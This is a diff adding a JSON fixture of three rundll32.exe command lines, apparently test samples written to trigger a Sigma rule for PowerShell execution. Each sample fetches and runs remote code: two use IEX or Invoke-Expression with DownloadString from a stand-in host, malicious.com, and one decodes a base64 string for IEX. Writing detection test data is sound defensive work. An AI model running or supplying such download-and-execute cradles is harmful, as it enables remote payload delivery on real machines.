@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rundll32.exe some.dll,FunctionName -Command \"IEX (DownloadString 'http://malicious.com/payload.ps1')\"",
+    "explanation": "This command simulates a PowerShell execution via rundll32.exe using IEX and DownloadString, which matches the Sigma rule's detection criteria. It uses rundll32.exe as the loader and includes a command line with IEX and DownloadString."
+  },
+  {
+    "output": "rundll32.exe some.dll,FunctionName -Command \"IEX ([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('aWV4ICgkZG93bmxvYWwlcygpKQ==')))\"",
+    "explanation": "This command simulates a PowerShell execution via rundll32.exe using IEX and FromBase64String, which matches the Sigma rule's detection criteria. It uses base64 encoding to obfuscate the command slightly."
+  },
+  {
+    "output": "rundll32.exe some.dll,FunctionName -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
+    "explanation": "This command simulates a PowerShell execution via rundll32.exe using Invoke-Expression and DownloadString, which matches the Sigma rule's detection criteria. It uses the full form of the command names."
+  }
+]
